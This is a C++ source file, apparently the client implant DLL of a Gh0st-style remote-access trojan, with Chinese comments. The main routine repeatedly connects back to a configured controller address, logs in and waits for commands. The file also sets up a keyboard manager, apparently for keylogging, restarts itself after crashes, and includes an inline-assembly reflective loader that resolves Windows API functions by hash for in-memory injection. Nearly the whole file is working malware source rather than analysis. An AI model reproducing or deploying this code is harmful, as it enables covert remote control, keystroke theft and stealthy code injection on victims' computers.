// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include "common/KeyboardManager.h"
#include "common/KernelManager.h"
#include "common/login.h"
#include "common/install.h"
#include <stdio.h>
#include <shlwapi.h>

#pragma comment(lib,"shlwapi.lib")
#include <iostream>
#include <fstream>

//using namespace std;


struct Connect_Address
{
	DWORD dwstact;
	char  strIP[MAX_PATH];
	int   nPort;
	char  ActiveXKeyGuid[MAX_PATH];	// 查找创建的Guid
}g_myAddress = { 0xCC28256,"",0,"" };


char	svcname[MAX_PATH];
SERVICE_STATUS_HANDLE hServiceStatus;
DWORD	g_dwCurrState;

char g_strSvchostName[MAX_PATH];//服务名
char g_strHost[MAX_PATH];
DWORD g_dwPort;
DWORD g_dwServiceType;

enum
{
	NOT_CONNECT, 			// 还没有连接
	GETLOGINFO_ERROR,		// 获取信息失败
	CONNECT_ERROR,			// 链接失败
	HEARTBEATTIMEOUT_ERROR 	// 心跳超时链接失败
};

DWORD WINAPI main(char *lpServiceName);
//处理异常
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	// 发生异常，重新创建进程
	HANDLE	hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)g_strSvchostName, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}

DWORD WINAPI main(char *lpServiceName)
{
	strcpy(g_strHost, g_myAddress.strIP);
	g_dwPort = g_myAddress.nPort;
	// lpServiceName,在ServiceMain返回后就没有了
	char	strServiceName[256] = {0};
	char	strKillEvent[50] = { 0 };
	HANDLE	hInstallMutex = NULL;
	//////////////////////////////////////////////////////////////////////////
	// Set Window Station
	HWINSTA hOldStation = GetProcessWindowStation();

	//---------------------------------------------------------------------------
	//char winsta0[] = { 0x07,0xbc,0xa3,0xa7,0xbb,0xb3,0xa7,0xf5};// winsta0
	//char* lpszWinSta = decodeStr(winsta0);						// 解密函数
	//
	//HWINSTA hWinSta = OpenWindowStation(lpszWinSta, FALSE, MAXIMUM_ALLOWED);
	//
	//memset(lpszWinSta, 0, winsta0[STR_CRY_LENGTH]);				// 填充0
	//delete lpszWinSta;											// 释放

	HWINSTA hWinSta = OpenWindowStation("winsta0", FALSE, MAXIMUM_ALLOWED);
	//---------------------------------------------------------------------------

	if (hWinSta != NULL)
		SetProcessWindowStation(hWinSta);
	//
	//////////////////////////////////////////////////////////////////////////

	 // 这里判断CKeyboardManager::g_hInstance是否为空 如果不为空则开启错误处理
	 // 这里要在dllmain中为CKeyboardManager::g_hInstance赋值
	if (CKeyboardManager::g_hInstance != NULL)
	{
		//设置异常
		SetUnhandledExceptionFilter(bad_exception);

		lstrcpy(strServiceName, lpServiceName);
		wsprintf(strKillEvent, "Global\\CcRem %d", GetTickCount()); // 随机事件名
		//wsprintf(strKillEvent, "Global\\Net_%d", GetTickCount()); // 随机事件名

		hInstallMutex = CreateMutex(NULL, true, g_strHost);
		// ReConfigService(strServiceName); 
		// 删除安装文件
		// DeleteInstallFile(lpServiceName);  
	}
	// 告诉操作系统:如果没有找到CD/floppy disc,不要弹窗口吓人
	SetErrorMode(SEM_FAILCRITICALERRORS);
	char	*lpszHost = NULL;
	DWORD	dwPort = 80;
	char	*lpszProxyHost = NULL;
	DWORD	dwProxyPort = 0;
	char	*lpszProxyUser = NULL;
	char	*lpszProxyPass = NULL;

	HANDLE	hEvent = NULL;

	//---这里声明了一个 CClientSocket类
	CClientSocket socketClient;
	BYTE	bBreakError = NOT_CONNECT; // 断开连接的原因,初始化为还没有连接

	//这个循环里判断是否连接成功如果不成功则继续向下
	while (1)
	{
		// 如果不是心跳超时，不用再sleep两分钟
		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
		{
			// 2分钟断线重连, 为了尽快响应killevent
			for (int i = 0; i < 2000; i++)
			{
				hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
				if (hEvent != NULL)
				{
					socketClient.Disconnect();
					CloseHandle(hEvent);
					break;
					break;

				}
				// 改一下
				Sleep(60);
			}
		}
		//上线地址
		lpszHost = g_strHost;
		dwPort = g_dwPort;

		if (lpszProxyHost != NULL)
			socketClient.setGlobalProxyOption(PROXY_SOCKS_VER5, lpszProxyHost, dwProxyPort, lpszProxyUser, lpszProxyPass);
		else
			socketClient.setGlobalProxyOption();

		DWORD dwTickCount = GetTickCount();
		//---调用Connect函数向主控端发起连接
		if (!socketClient.Connect(lpszHost, dwPort))
		{
			bBreakError = CONNECT_ERROR;       //---连接错误跳出本次循环
			continue;
		}
		// 登录
		DWORD dwExitCode = SOCKET_ERROR;
		sendLoginInfo(strServiceName, &socketClient, GetTickCount() - dwTickCount);
		// 接成功后声明了一个CKernelManager 到CKernelManager
		CKernelManager	manager(&socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort);
		// socketClient中的主回调函数设置位这CKernelManager类中的OnReceive 
		//（每个功能类都有OnReceive函数来处理接受的数据他们都继承自父类CManager）
		socketClient.setManagerCallBack(&manager);

		//////////////////////////////////////////////////////////////////////////
		// 等待控制端发送激活命令，超时为10秒，重新连接,以防连接错误
		for (int i = 0; (i < 10 && !manager.IsActived()); i++)
		{
			Sleep(1000);
		}
		// 10秒后还没有收到控制端发来的激活命令，说明对方不是控制端，重新连接，获取是否有效标志
		if (!manager.IsActived())
			continue;

		//////////////////////////////////////////////////////////////////////////

		DWORD	dwIOCPEvent;
		dwTickCount = GetTickCount();// 获取时间戳

		do
		{
			hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
			dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100);
			Sleep(500);
		} while (hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);

		if (hEvent != NULL)
		{
			socketClient.Disconnect();
			CloseHandle(hEvent);
			break;
		}
	}
#ifdef _DLL
	//////////////////////////////////////////////////////////////////////////
	// Restor WindowStation and Desktop	
	// 不需要恢复桌面，因为如果是更新服务端的话，新服务端先运行，此进程恢复掉了卓面，会产生黑屏
	// 	SetProcessWindowStation(hOldStation);
	// 	CloseWindowStation(hWinSta);
	//
	//////////////////////////////////////////////////////////////////////////
#endif

	SetErrorMode(0);
	ReleaseMutex(hInstallMutex);
	CloseHandle(hInstallMutex);
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
		CKeyboardManager::g_hInstance = (HINSTANCE)hModule;
		CKeyboardManager::m_dwLastMsgTime = GetTickCount();
		CKeyboardManager::Initialization();
		break;
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}



extern "C" __declspec(dllexport) void TestFun(char* strHost, int nPort)
{
	strcpy(g_strHost, strHost);   // 保存上线地址
	g_dwPort = nPort;             // 保存上线端口
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)g_strHost, 0, NULL);
	//这里等待线程结束
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
}



FILE * pFile;

long lSize;

char * buffer;

size_t result;
extern "C" __declspec(dllexport) bool InitTestReflectiveLoader()
{


		// 一个不漏地读入整个文件，只能采用二进制方式打开

		pFile = fopen(".\\..\\..\\bin\\server\\CcMainDll.dll", "rb");

		if (pFile == NULL)

		{

			fputs("File error", stderr);

			printf("open file fail");

			return false;

		}



		// 获取文件大小 

		fseek(pFile, 0, SEEK_END);

		lSize = ftell(pFile);

		rewind(pFile);



		// 分配内存存储整个文件

		buffer = (char*)malloc(sizeof(char)*lSize);

		if (buffer == NULL)

		{

			fputs("Memory error", stderr);

			printf("Memory alloc falil");

			return false;

		}



		// 将文件拷贝到buffer中 

		result = fread(buffer, 1, lSize, pFile);

		if (result != lSize)

		{

			fputs("Reading error", stderr);

			printf("Load file to memory falil");

			return false;

		}
		return true;

}



inline DWORD GetCurrentPositionAddress()
{
	_asm{
		push    ebp
		mov     ebp, esp
		mov     eax, [ebp + 4]
		pop     ebp
		retn
	}
}

inline DWORD call_ror_0xD()
{
	_asm {
		push    ebp
		mov     ebp, esp
		mov     eax, [ebp + 8]
		ror		eax, 0x0D
		pop     ebp
		retn
	}
}

inline DWORD calc_name_hash()
{
	_asm {
		retn
	}
}

enum LocalEnum
{
	Nop,
	memAddress					= 4,
	pLoadLibraryA				= 8,
	pGetProcAddress				= 0xC,
	pVirtualAlloc				= 0x10,
	pVirtualProtect				= 0x14,
	pNtFlushInstructionCache	= 0x18,

	varLocalFindPE				= 0x1c,
	varLocalFS30_A				= 0x20,		// var_8
	varLocalFS30_B				= 0x24,		// var_C
	var_4						= 0x28,		// FullDllName
	BaseDllName					= 0x2c,		// FullDllName
	name_hash					= 0x30,
	var_20						= 0x34,
	var_30						= 0x38,		// cmp_name_hash
	var_28						= 0x3c,
	exp_AddressOfNames 			= 0x40,
	AddressOfNameOrdinals		= 0x44

};



extern "C" __declspec(dllexport) void ReflectiveLoader()
{
	_asm{
		push    ebp
		mov     ebp, esp
		sub     esp, 0x100					// 抬高堆栈创建局部变量空间
		mov     eax, 4
		initLocalVar:						// 循环initLocalVar初始化局部变量空间为0
		mov		[ebp + eax], 0
		inc		eax
		cmp		eax ,0x100
		jnz		initLocalVar

		call    GetCurrentPositionAddress	// 获取当前位置地址
		mov		eax, buffer
		mov		[ebp + memAddress], eax		// 保存当前代码所在的地址 memAddress
		
		addressAdd :
		mov     eax, 1
		test    eax, eax					// 判断eax是否获取到当前地址
		jz      find_success
			
		mov     ecx, [ebp + memAddress]		// 查找DOS头
		movzx   edx, word ptr[ecx]
		cmp     edx, 0x5A4D
		jnz    noFindFlag


        mov     eax, [ebp + memAddress]
        mov     ecx, [eax + 0x3C]			// + 0x3C 找到DOS Header e_lfanew
        mov		[ebp + varLocalFindPE], ecx
        cmp		dword ptr[ebp + varLocalFindPE], 0x40
        jb      noFindFlag					// 地址address - 1
        cmp		dword ptr[ebp + varLocalFindPE], 0x400
        jnb     noFindFlag					// 地址address - 1

        mov     edx, [ebp + varLocalFindPE]
        add     edx, [ebp + memAddress]
        mov		[ebp + varLocalFindPE], edx
        mov     eax, [ebp + varLocalFindPE]
        cmp     dword ptr[eax], 0x4550		// 判断PE Header Signature PE标志
        jnz     noFindFlag					// 地址address - 1
		jmp     find_success				// 找到了singtrue 跳转

			noFindFlag :
		mov     ecx, [ebp + memAddress]		// 地址address - 1
		sub     ecx, 1
		mov		[ebp + memAddress], ecx
		jmp		addressAdd

			find_success:
		mov     edx, fs:[0x30]				// 获取PEB结构地址
		mov		[ebp + varLocalFS30_A], edx
		mov     eax, [ebp + varLocalFS30_A]
		mov     ecx, [eax + 0x0C]			// 获取Ptr32 _PEB_LDR_DATA 进程加载模块链表(Ldr)
		mov		[ebp + varLocalFS30_A], ecx
		mov     edx, [ebp + varLocalFS30_A]
		mov     eax, [edx + 0x14]			// 获取结构中InMemoryOrderModuleList 顺序模块列表
		mov		[ebp + varLocalFS30_B], eax

			loc_46327B: 
		cmp		[ebp + varLocalFS30_B], 0
		jz      find_moudle_null
		mov     ecx, [ebp + varLocalFS30_B]
		mov     edx, [ecx + 0x28]			// FullDllName_buff 模块名称
		mov		[ebp + BaseDllName], edx
		mov     eax, [ebp + varLocalFS30_B]
		mov     cx, [eax + 0x24]			// UNICODE_STRING FullDllName Length
		mov		[ebp + var_4], cx			// var_4保存FullDllName字符串长度
		mov		[ebp + name_hash], 0

			calc_hash:
		mov     edx, [ebp + name_hash]
		push    edx
		call    call_ror_0xD
		add     esp, 4
		mov		[ebp + name_hash], eax		// ror后的eax为返回值
		mov     eax, [ebp + BaseDllName]
		movzx   ecx, byte ptr[eax]
		cmp     ecx, 0x61					// 判断获取到的模块字符串的指定位置，小于跳转，地址 + 1，比对下一个字母
		jl      less_flage
		mov     edx, [ebp + BaseDllName]	// 获取名称byte
		movzx   eax, byte ptr[edx]			// eax = byte
		mov     ecx, [ebp + name_hash]		// 计算值
		lea     edx, [ecx + eax - 0x20]		// hash + FullDllName[index] - 0x20
		mov		[ebp + name_hash], edx		// 得到结果
		jmp     calc_end

			less_flage:
		add     ecx, [ebp + name_hash]
		mov[ebp + name_hash], ecx

			calc_end:
		mov     edx, [ebp + BaseDllName]	// 名称地址 + 1
		add     edx, 1
		mov		[ebp + BaseDllName], edx
		mov     ax, [ebp + var_4]			// 字符串名称长度 - 1
		sub     ax, 1
		mov		[ebp + var_4], ax
		movzx   ecx, [ebp + var_4]
		test    ecx, ecx					// 判断长度是否为0，没有为0继续计算hash
		jnz     calc_hash					// 计算简单的模块名称name_hash
			
		cmp		[ebp + name_hash], 0x6A4ABC5B	// 6A4ABC5B = Kernel32
		jnz     no_Kernel32_hash				// 3CFA685D = ntdll
		mov     edx, [ebp + varLocalFS30_B]		// 获取结构中InMemoryOrderModuleList
		mov     eax, [edx + 0x10]
		mov		[ebp + varLocalFS30_A], eax		// +10偏移获取DllBase基址
		mov     ecx, [ebp + varLocalFS30_A]
		mov     edx, [ebp + varLocalFS30_A]
		add     edx, [ecx + 0x3C]				// 获取PE IMAGE_DOS_HRADER e_lfanew
		mov		[ebp + var_20], edx				
		mov     eax, 8
		imul    ecx, eax, 0						// imul 1, 2, 3	  2 3乘积保存到1 0获取第一项目录导出表
		mov     edx, [ebp + var_20]
		lea     eax, [edx + ecx + 0x78]			// 获取IMAGE_OPTIONAL_HEADER -> IMAGE_DATA_DIRECTORY[0] EXPORT 导出表
		mov		[ebp + exp_AddressOfNames], eax
		mov     ecx, [ebp + exp_AddressOfNames]
		mov     edx, [ebp + varLocalFS30_A]		// edx = 基地址
		add     edx, [ecx]						// edx =  基地址 + 导出表地址
		mov		[ebp + var_20], edx
		mov     eax, [ebp + var_20]				// var_20 = IMAGE_EXPORT_DIRECTORY 地址
		mov     ecx, [ebp + varLocalFS30_A]		// ecx = 基地址
		add     ecx, [eax + 0x20]				// 获取 IMAGE_EXPORT_DIRECTORY +0x20 AddressOfNames	导出的函数名称表的RVA 也就是 函数名称表
		mov		[ebp + exp_AddressOfNames], ecx
		mov     edx, [ebp + var_20]
		mov     eax, [ebp + varLocalFS30_A]
		add     eax, [edx + 0x24]				// 获取 IMAGE_EXPORT_DIRECTORY +0x24 AddressOfNameOrdinals	导出函数序号表的RVA 也就是 函数序号表
		mov		[ebp + AddressOfNameOrdinals], eax
		mov     ecx, 4
		mov		[ebp + var_4], cx				// 设置计数var_4，需要四个函数，找到一个 - 1 ，为 0 时查找完毕

			find_next_ker_fun:
		movzx   edx, [ebp+var_4]
		test    edx, edx
		jle     cmp_need_function

		mov     eax, [ebp+exp_AddressOfNames]	// exp_AddressOfNames = 函数名称表
		mov     ecx, [ebp+varLocalFS30_A]		// varLocalFS30_A = 基地址
		add     ecx, [eax]						// 获取函数名称地址
		push    ecx
		call    calc_name_hash					// 计算函数名称hash值
		add     esp, 4
		mov     [ebp+var_30], eax				// 计算的hash保存后进行比较
		cmp     [ebp+var_30], 0xEC0E4E8E 		// 0xEC0E4E8E = LoadLibraryA
		jz      find_function_hash
		cmp     [ebp+var_30], 0x7C0DFCAA		// 0x7C0DFCAA = GetProcAddress
		jz      find_function_hash
		cmp     [ebp+var_30], 0x91AFCA54 		// 0x91AFCA54 = VirtualAlloc
		jz      find_function_hash
		cmp     [ebp+var_30], 0x7946C61B 		// 0x7946C61B = VirtualProtect
		jnz     no_find_function_hash

			find_function_hash: 
		mov     edx, [ebp+var_20]				// var_20 = IMAGE_EXPORT_DIRECTORY 地址
		mov     eax, [ebp+varLocalFS30_A]
		add     eax, [edx+0x1C]					// IMAGE_EXPORT_DIRECTORY + 0x1C = AddressOfFunctions 导出的函数地址的 地址表  RVA  也就是 函数地址表  
		mov     [ebp+var_28], eax
		mov     ecx, [ebp+AddressOfNameOrdinals]// 保存序号索引
		movzx   edx, word ptr [ecx]
		mov     eax, [ebp+var_28]
		lea     ecx, [eax+edx*4]				// 序号索引IMAGE_EXPORT_DIRECTORY 找到函数地址
		mov     [ebp+var_28], ecx				// var_28  = AddressOfFunctions[AddressOfNameOrdinals]

		cmp     [ebp+var_30], 0xEC0E4E8E
		jnz     no_LoadLibraryA
		mov     edx, [ebp+var_28]			
		mov     eax, [ebp+varLocalFS30_A]		// eax = varLocalFS30_A = 基地址
		add     eax, [edx]						// 计算得到函数地址
		mov     [ebp+LoadLibraryA], eax			// 保存到局部堆栈LoadLibraryA
		jmp     find_index_dec					// 查找下一个
			
			no_LoadLibraryA:                           
		cmp     [ebp+var_30], 0x7C0DFCAA
		jnz     no_GetProcAddress
		mov     ecx, [ebp+var_28]
		mov     edx, [ebp+varLocalFS30_A]		// edx = varLocalFS30_A = 基地址
		add     edx, [ecx]						// 计算得到函数地址
		mov     [ebp+GetProcAddress], edx		// 保存到局部堆栈GetProcAddress
		jmp     find_index_dec					// 查找下一个
			
			
			no_GetProcAddress:                           
		cmp     [ebp+var_30], 0x91AFCA54
		jnz     no_VirtualAlloc
		mov     eax, [ebp+var_28]
		mov     ecx, [ebp+varLocalFS30_A]		// ecx = varLocalFS30_A = 基地址
		add     ecx, [eax]						// 计算得到函数地址
		mov     [ebp+VirtualAlloc], ecx			// 保存到局部堆栈VirtualAlloc
		jmp     find_index_dec					// 查找下一个

			no_VirtualAlloc:
		cmp     [ebp+var_30], 0x7946C61B
		jnz     find_index_dec
		mov     edx, [ebp+var_28]
		mov     eax, [ebp+varLocalFS30_A]		// eax = varLocalFS30_A = 基地址
		add     eax, [edx]						// 计算得到函数地址VirtualProtect
		mov     [ebp+VirtualProtect], eax		// 保存到局部堆栈
			
			find_index_dec:                            
		mov     cx, [ebp+var_4]					// 找到函数后 计数 - 1
		sub     cx, 1
		mov     [ebp+var_4], cx
			
			no_find_function_hash:
		mov     edx, [ebp+exp_AddressOfNames]	
		add     edx, 4
		mov     [ebp+exp_AddressOfNames], edx		// 查找下一个函数名称
		mov     eax, [ebp+AddressOfNameOrdinals]
		add     eax, 2
		mov     [ebp+AddressOfNameOrdinals], eax	// 查找下一个函数序号
		jmp     find_next_ker_fun

			cmp_need_function:                      
		jmp     loc_463506
				
			no_Kernel32_hash:
        cmp     [ebp+name_hash], 0x3CFA685D 		//; 3CFA685D = ntdll
        jnz     loc_463506
        mov     ecx, [ebp+varLocalFS30_B]
        mov     edx, [ecx+0x10]  					//; +10偏移获取DllBase基址
        mov     [ebp+varLocalFS30_A], edx
        mov     eax, [ebp+varLocalFS30_A]
        mov     ecx, [ebp+varLocalFS30_A]
        add     ecx, [eax+0x3C]  					//; 获取PE IMAGE_DOS_HRADER e_lfanew
        mov     [ebp+var_20], ecx
        mov     edx, 8
        imul    eax, edx, 0
        mov     ecx, [ebp+var_20]
        lea     edx, [ecx+eax+0x78] 				//; 获取IMAGE_OPTIONAL_HEADER -> IMAGE_DATA_DIRECTORY[0] EXPORT 导出表
        mov     [ebp+exp_AddressOfNames], edx
        mov     eax, [ebp+exp_AddressOfNames]
        mov     ecx, [ebp+varLocalFS30_A] 			// ecx = 基地址
        add     ecx, [eax]     						// 基地址 + 导出表地址
        mov     [ebp+var_20], ecx
        mov     edx, [ebp+var_20]
        mov     eax, [ebp+varLocalFS30_A]
        add     eax, [edx+0x20]  					// 获取 IMAGE_EXPORT_DIRECTORY +0x20 AddressOfNames
        mov     [ebp+exp_AddressOfNames], eax
        mov     ecx, [ebp+var_20]
        mov     edx, [ebp+varLocalFS30_A]
        add     edx, [ecx+0x24]  					// 获取 IMAGE_EXPORT_DIRECTORY +0x24 AddressOfNameOrdinals
        mov     [ebp+AddressOfNameOrdinals], edx
        mov     eax, 1
        mov     [ebp+var_4], ax

			find_next_nt_fun:						// 同上面一样 
        movzx   ecx, [ebp+var_4]
        test    ecx, ecx
        jle      loc_463506
        mov     edx, [ebp+exp_AddressOfNames]
        mov     eax, [ebp+varLocalFS30_A]
        add     eax, [edx]
        push    eax
        call    calc_name_hash
        add     esp, 4
        mov     [ebp+var_30], eax
        cmp     [ebp+var_30], 0x534C0AB8 			// 0x534C0AB8 = NtFlushInstructionCache
        jnz      no_NtFlushInstructionCache
        mov     ecx, [ebp+var_20]
        mov     edx, [ebp+varLocalFS30_A]
        add     edx, [ecx+0x1C]
        mov     [ebp+var_28], edx
        mov     eax, [ebp+AddressOfNameOrdinals]
        movzx   ecx, word ptr [eax]
        mov     edx, [ebp+var_28]
        lea     eax, [edx+ecx*4]
        mov     [ebp+var_28], eax
        cmp     [ebp+var_30], 0x534C0AB8
        jnz      find_nt_index_dec
        mov     ecx, [ebp+var_28]
        mov     edx, [ebp+varLocalFS30_A]
        add     edx, [ecx]
        mov     [ebp+pNtFlushInstructionCache], edx 	// 获取函数地址NtFlushInstructionCache保存

			find_nt_index_dec:                            
        mov     ax, [ebp+var_4]
        sub     ax, 1
        mov     [ebp+var_4], ax

			no_NtFlushInstructionCache:                            
        mov     ecx, [ebp+exp_AddressOfNames]
        add     ecx, 4
        mov     [ebp+exp_AddressOfNames], ecx
        mov     edx, [ebp+AddressOfNameOrdinals]
        add     edx, 2
        mov     [ebp+AddressOfNameOrdinals], edx
        jmp      find_next_nt_fun


			find_moudle_null:

			loc_463506:


	}

}





